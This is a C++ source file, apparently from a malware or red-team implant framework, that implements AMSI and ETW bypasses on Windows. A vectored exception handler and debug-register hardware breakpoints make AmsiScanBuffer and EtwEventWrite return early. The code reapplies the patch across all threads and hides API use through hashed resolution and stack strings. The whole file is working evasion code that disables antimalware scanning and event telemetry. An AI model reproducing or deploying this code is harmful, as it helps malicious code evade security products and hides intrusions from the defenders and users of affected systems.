#include <common.h>
#include <module.h>
#include <stackstr.h>
#include <tlhelp32.h>
#include <evasion/spoof_dispatch.h>

#if defined(INCLUDE_EVASION_AMSI) || defined(INCLUDE_EVASION_ETW)

using namespace stardust;

namespace starburst {

#define HWBP_SETUP_MAGIC 0x53424850ULL

// ── VEH handler ──
// Two modes (fully PIC - no static data, all state via registers/CONTEXT):
//   1) Setup: catches ud2 (EXCEPTION_ILLEGAL_INSTRUCTION) with magic in
//      RSI/EAX. Reads target from RCX and DR index from RDX, sets DR
//      registers via ContextRecord. ud2 is 2 bytes (0x0F 0x0B).
//   2) Runtime: catches EXCEPTION_SINGLE_STEP from DR0/DR1 hits,
//      returns 0 and skips the hooked function.

static auto WINAPI declfn veh_hw_bp_handler(
    EXCEPTION_POINTERS* ep ) -> LONG
{
    auto ctx = ep->ContextRecord;

#ifdef _WIN64
    if ( ep->ExceptionRecord->ExceptionCode == EXCEPTION_ILLEGAL_INSTRUCTION
         && ctx->Rsi == HWBP_SETUP_MAGIC ) {

        auto target = ctx->Rcx;
        auto dr_idx = static_cast<int>( ctx->Rdx );

        switch ( dr_idx ) {
            case 0: ctx->Dr0 = target; break;
            case 1: ctx->Dr1 = target; break;
            case 2: ctx->Dr2 = target; break;
            case 3: ctx->Dr3 = target; break;
        }

        ctx->Dr7 |= ( 1ULL << ( dr_idx * 2 ) );
        ctx->Rax = 1;
        ctx->Rip += 2;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
#else
    if ( ep->ExceptionRecord->ExceptionCode == EXCEPTION_ILLEGAL_INSTRUCTION
         && ctx->Eax == static_cast<DWORD>( HWBP_SETUP_MAGIC ) ) {

        auto target = ctx->Ecx;
        auto dr_idx = static_cast<int>( ctx->Edx );

        switch ( dr_idx ) {
            case 0: ctx->Dr0 = target; break;
            case 1: ctx->Dr1 = target; break;
            case 2: ctx->Dr2 = target; break;
            case 3: ctx->Dr3 = target; break;
        }

        ctx->Dr7 |= ( 1UL << ( dr_idx * 2 ) );
        ctx->Eax = 1;
        ctx->Eip += 2;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
#endif

    if ( ep->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP )
        return EXCEPTION_CONTINUE_SEARCH;

    auto addr = reinterpret_cast<uintptr_t>(
        ep->ExceptionRecord->ExceptionAddress );

    if ( addr == ctx->Dr0 || addr == ctx->Dr1 ) {
#ifdef _WIN64
        ctx->Rax = 0;
        ctx->Rip = *reinterpret_cast<uintptr_t*>( ctx->Rsp );
        ctx->Rsp += 8;
#else
        ctx->Eax = 0;
        ctx->Eip = *reinterpret_cast<uintptr_t*>( ctx->Esp );
        ctx->Esp += 4;
#endif
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

// ── Install the VEH handler (once) ──

static auto declfn ensure_veh_installed( instance& inst ) -> bool {
#if defined(INCLUDE_EVASION_AMSI) && defined(_WIN64)
    if ( inst.evasion.amsi_veh )
        return true;
#endif

    auto pAddVEH = reinterpret_cast<decltype(RtlAddVectoredExceptionHandler)*>(
        resolve::_api( inst.ntdll.handle,
            expr::hash_string( "RtlAddVectoredExceptionHandler" ) ) );

    if ( !pAddVEH ) return false;

    auto handle = pAddVEH( 1,
        reinterpret_cast<PVECTORED_EXCEPTION_HANDLER>( veh_hw_bp_handler ) );

    if ( !handle ) return false;

#if defined(INCLUDE_EVASION_AMSI) && defined(_WIN64)
    inst.evasion.amsi_veh = handle;
#endif

    return true;
}

// ── Set a hardware breakpoint via exception-based DR install ──
// Fires ud2 (0x0F 0x0B) with target in RCX, DR index in RDX, magic in RSI.
// VEH handler catches EXCEPTION_ILLEGAL_INSTRUCTION, sets DR registers via
// ContextRecord, advances RIP by 2. Fully PIC - no static data.
//
// LIMITATION: debug registers are per-thread. ud2 only patches the calling
// thread. patch_etw/patch_amsi callers must also run hwbp_patch_all_threads()
// after spawning worker threads, or threads created later run unpatched.

static auto declfn set_hw_breakpoint(
    instance& inst,
    void*     target_addr,
    int       dr_index ) -> bool
{
#ifdef _WIN64
    uintptr_t result = 0;
    __asm__ volatile (
        "ud2"
        : "=a" ( result )
        : "c" ( reinterpret_cast<uintptr_t>( target_addr ) ),
          "d" ( static_cast<uintptr_t>( dr_index ) ),
          "S" ( static_cast<uintptr_t>( HWBP_SETUP_MAGIC ) )
        : "memory"
    );
    return result != 0;
#else
    uintptr_t result = static_cast<uintptr_t>( HWBP_SETUP_MAGIC );
    __asm__ volatile (
        "ud2"
        : "+a" ( result )
        : "c" ( reinterpret_cast<uintptr_t>( target_addr ) ),
          "d" ( static_cast<uintptr_t>( dr_index ) )
        : "memory"
    );
    return result != 0;
#endif
}

#ifdef _WIN64

typedef BOOL  (WINAPI *fnThread32First)( HANDLE, LPTHREADENTRY32 );
typedef BOOL  (WINAPI *fnThread32Next)( HANDLE, LPTHREADENTRY32 );
typedef NTSTATUS (NTAPI *fnNtGetContextThread)( HANDLE, PCONTEXT );
typedef NTSTATUS (NTAPI *fnNtSetContextThread)( HANDLE, PCONTEXT );

/* Patch DR registers on an arbitrary thread via NtGet/NtSetContextThread.
 * Suspends the target first so its context is stable. The ud2/VEH path
 * (set_hw_breakpoint) only reaches the calling thread - worker threads
 * spawned after patch_etw() would otherwise run with ETW/AMSI unpatched. */
static auto declfn hwbp_patch_thread(
    instance& inst, HANDLE h_thread,
    void* etw_target, void* amsi_target ) -> bool
{
    auto pGetCtx = reinterpret_cast<fnNtGetContextThread>(
        resolve::_api( inst.ntdll.handle, expr::hash_string( "NtGetContextThread" ) ) );
    auto pSetCtx = reinterpret_cast<fnNtSetContextThread>(
        resolve::_api( inst.ntdll.handle, expr::hash_string( "NtSetContextThread" ) ) );
    auto pSuspend = reinterpret_cast<DWORD (WINAPI*)( HANDLE )>(
        resolve::_api( inst.kernel32.handle, expr::hash_string( "SuspendThread" ) ) );
    auto pResume = reinterpret_cast<DWORD (WINAPI*)( HANDLE )>(
        resolve::_api( inst.kernel32.handle, expr::hash_string( "ResumeThread" ) ) );

    if ( !pGetCtx || !pSetCtx || !pSuspend || !pResume ) return false;

    if ( pSuspend( h_thread ) == (DWORD)-1 ) return false;

    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    bool ok = false;

    if ( pGetCtx( h_thread, &ctx ) == 0 ) {
        if ( etw_target ) {
            ctx.Dr0 = reinterpret_cast<DWORD64>( etw_target );
            ctx.Dr7 |= ( 1ULL << 0 );
        }
        if ( amsi_target ) {
            ctx.Dr1 = reinterpret_cast<DWORD64>( amsi_target );
            ctx.Dr7 |= ( 1ULL << 2 );
        }
        ok = ( pSetCtx( h_thread, &ctx ) == 0 );
    }

    pResume( h_thread );
    return ok;
}

/* Walk every thread in the current process and apply the DR patch.
 * Call after spawning worker threads; each new thread needs one pass.
 * Current thread is skipped (already patched via ud2). */
static auto declfn hwbp_patch_all_threads(
    instance& inst, void* etw_target, void* amsi_target ) -> void
{
    auto pSnap = reinterpret_cast<HANDLE (WINAPI*)( DWORD, DWORD )>(
        resolve::_api( inst.kernel32.handle,
            expr::hash_string( "CreateToolhelp32Snapshot" ) ) );
    auto pFirst = reinterpret_cast<fnThread32First>(
        resolve::_api( inst.kernel32.handle, expr::hash_string( "Thread32First" ) ) );
    auto pNext = reinterpret_cast<fnThread32Next>(
        resolve::_api( inst.kernel32.handle, expr::hash_string( "Thread32Next" ) ) );
    auto pOpen = reinterpret_cast<HANDLE (WINAPI*)( DWORD, BOOL, DWORD )>(
        resolve::_api( inst.kernel32.handle, expr::hash_string( "OpenThread" ) ) );

    if ( !pSnap || !pFirst || !pNext || !pOpen ) return;

    DWORD pid = RtlGetCurrentProcessId();
    DWORD tid = RtlGetCurrentThreadId();

    HANDLE snap = pSnap( TH32CS_SNAPTHREAD, pid );
    if ( snap == INVALID_HANDLE_VALUE ) return;

    THREADENTRY32 te = {};
    te.dwSize = sizeof( THREADENTRY32 );

    if ( pFirst( snap, &te ) ) {
        do {
            if ( te.th32OwnerProcessID != pid ) continue;
            if ( te.th32ThreadID == tid ) continue;

            HANDLE ht = pOpen( THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT |
                               THREAD_SET_CONTEXT, FALSE, te.th32ThreadID );
            if ( !ht ) continue;

            hwbp_patch_thread( inst, ht, etw_target, amsi_target );
            inst.kernel32.CloseHandle( ht );
        } while ( pNext( snap, &te ) );
    }
    inst.kernel32.CloseHandle( snap );
}

#endif /* _WIN64 */

#ifdef INCLUDE_EVASION_ETW
static auto declfn patch_etw( instance& inst ) -> bool {
    auto pEtwEventWrite = reinterpret_cast<void*>(
        resolve::_api( inst.ntdll.handle,
            expr::hash_string( "EtwEventWrite" ) ) );

    if ( !pEtwEventWrite ) return false;

    if ( !ensure_veh_installed( inst ) )
        return false;

    if ( !set_hw_breakpoint( inst, pEtwEventWrite, 0 ) )
        return false;

    return true;
}
#endif // INCLUDE_EVASION_ETW

#if defined(INCLUDE_EVASION_AMSI) && defined(_WIN64)
static auto declfn patch_amsi( instance& inst ) -> bool {
    STK_AMSI(_n);
    auto h_amsi = (HMODULE)SCALL( inst, kernel32.LoadLibraryA, _n );
    if ( !h_amsi ) return false;

    auto pAmsiScanBuffer = reinterpret_cast<void*>(
        resolve::_api( reinterpret_cast<uintptr_t>( h_amsi ),
            expr::hash_string( "AmsiScanBuffer" ) ) );
    if ( !pAmsiScanBuffer ) return false;

    if ( !ensure_veh_installed( inst ) )
        return false;

    if ( !set_hw_breakpoint( inst, pAmsiScanBuffer, 1 ) )
        return false;

    return true;
}
#endif // INCLUDE_EVASION_AMSI && _WIN64

// ── Public API ──

#ifdef INCLUDE_EVASION_ETW
auto declfn evasion_patch_etw( instance& inst ) -> void {
    if ( inst.evasion.etw_patched ) return;
    inst.evasion.etw_patched = patch_etw( inst );
    DBG_PRINT( inst, "ETW patch: %s\n",
        inst.evasion.etw_patched ?
            symbol<const char*>( "OK" ) :
            symbol<const char*>( "FAIL" ) );
}
#endif

#if defined(INCLUDE_EVASION_AMSI) && defined(_WIN64)
auto declfn evasion_patch_amsi( instance& inst ) -> void {
    if ( inst.evasion.amsi_patched ) return;
    inst.evasion.amsi_patched = patch_amsi( inst );
    DBG_PRINT( inst, "AMSI patch: %s\n",
        inst.evasion.amsi_patched ?
            symbol<const char*>( "OK" ) :
            symbol<const char*>( "FAIL" ) );
}
#endif

#ifdef _WIN64
/* Re-apply DR patches to every thread in the process. Call after spawning
 * any worker thread - debug registers are per-thread and threads created
 * after patch_etw/patch_amsi run with those hooks absent. */
auto declfn evasion_hwbp_repatch( instance& inst ) -> void {
    void* etw_target = nullptr;
    void* amsi_target = nullptr;

#ifdef INCLUDE_EVASION_ETW
    if ( inst.evasion.etw_patched ) {
        etw_target = reinterpret_cast<void*>(
            resolve::_api( inst.ntdll.handle,
                expr::hash_string( "EtwEventWrite" ) ) );
    }
#endif
#if defined(INCLUDE_EVASION_AMSI) && defined(_WIN64)
    if ( inst.evasion.amsi_patched ) {
        STK_AMSI(_n_amsi);
        auto h_amsi = (HMODULE)SCALL( inst, kernel32.LoadLibraryA, _n_amsi );
        if ( h_amsi ) {
            amsi_target = reinterpret_cast<void*>(
                resolve::_api( reinterpret_cast<uintptr_t>( h_amsi ),
                    expr::hash_string( "AmsiScanBuffer" ) ) );
        }
    }
#endif
    if ( etw_target || amsi_target ) {
        hwbp_patch_all_threads( inst, etw_target, amsi_target );
    }
}
#endif /* _WIN64 */

} // namespace starburst

#endif
